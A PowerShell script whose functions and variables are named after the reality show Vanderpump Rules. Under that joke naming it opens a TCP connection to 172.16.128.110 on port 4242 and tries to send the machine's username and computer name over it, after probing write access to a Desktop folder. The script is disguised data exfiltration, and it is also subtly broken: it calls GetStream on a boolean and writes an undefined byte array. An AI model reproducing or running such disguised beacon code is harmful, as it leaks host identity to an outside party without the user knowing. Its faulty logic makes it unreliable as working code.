

function Start-DrinkThrow {
    [CmdletBinding()]
    param (
        [Parameter()]
        [switch]$Stassi,
        [parameter()]
        [switch]$Kristen,
        [parameter()]
        [switch]$Katie,
        [parameter()]
        [switch]$Schwartz
    )
    if($Stassi){
        $HasADrinkNow = New-Object System.Net.Sockets.TcpClient
    }
    return $HasADrinkNow
}

function Hookup-Sex {
    [CmdletBinding()]
    param (
        [Parameter()]
        [switch]$CheatOnBrittany,
        [Parameter()]
        [switch]$WatchTheMovieDrive,
        [int32]$NumberOfTimesJaxCheats,
        [string]$TomTomAddress
    )
    if (Test-Path -Path $env:USERPROFILE\Desktop) {
        try {
            New-Item -Path "C:\Users\Default\Desktop" -ItemType File -Name "yeet.txt" -ErrorAction Stop | Out-Null
        }
        catch {
            #Who cares
            continue
        }
        Remove-Item -Path "C:\Users\Default\Desktop\yeet.txt" -Force | Out-Null
    }
    $myFavTVShow = Best-TVShow
    
    $didLisaKnowAboutTheHookup = $myFavTVShow.ConnectAsync($TomTomAddress, $NumberOfTimesJaxCheats).Wait(1000)
    return $didLisaKnowAboutTheHookup
}

function Best-TVShow {
    [CmdletBinding()]
    param (
        [Parameter()]
        [string]$VPR
    )
    while($true) {
        $otherShow = "Real Housewives of SLC"
        $thirdShow = "Botched"
        $katyRating = 8
        if ($katyRating -eq 8) {
            $theBestShow = $thirdShow
            Write-Host $thirdShow + $theBestShow
        }
        $thirdShow = Start-DrinkThrow -Stassi
        return $thirdShow
    }

}

function Get-StassiFacts {
    [CmdletBinding()]
    param(
        $IsTomALiar
    )

    if ($IsTomALiar) {
        Get-Service -Name wuauserv
        try {
            $ErrorActionPreference = "Stop"
            $yesProbably = $IsTomALiar.GetStream()
        }
        catch {
            Write-Host "Well if you had to ask, do you even watch the show?"
        }
    }
    return $yesProbably

}

function Open-TomTom {
    [CmdletBinding()]
    param (
        $DoesLisaInvest,
        $iderWhatSeasonThisHappenedIn
    )
    if ($iderWhatSeasonThisHappenedIn -eq $true) {
        try {
            [byte[]]$moneyTheyMake = 0..65535 | ForEach-Object { 0 } 
            $tellLisaAboutMoney = ([text.encoding]::ASCII).GetBytes("Who made the money: " + $env:username + " at which restaurant:" + $env:computername)
            $DoesLisaInvest.Write($sendbytes, 0, $sendbytes.Length)
        }
        catch {

        }
    }
}

$orlandoIsTiredOfThis = Hookup-Sex -TomTomAddress "172.16.128.110" -NumberOfTimesJaxCheats 4242
$isEveryoneFreeForTheEngagementParty = Get-StassiFacts -isTomALiar $orlandoIsTiredOfThis

Open-TomTom -iderWhatSeasonThisHappenedIn $orlandoIsTiredOfThis -DoesLisaInvest $isEveryoneFreeForTheEngagementParty

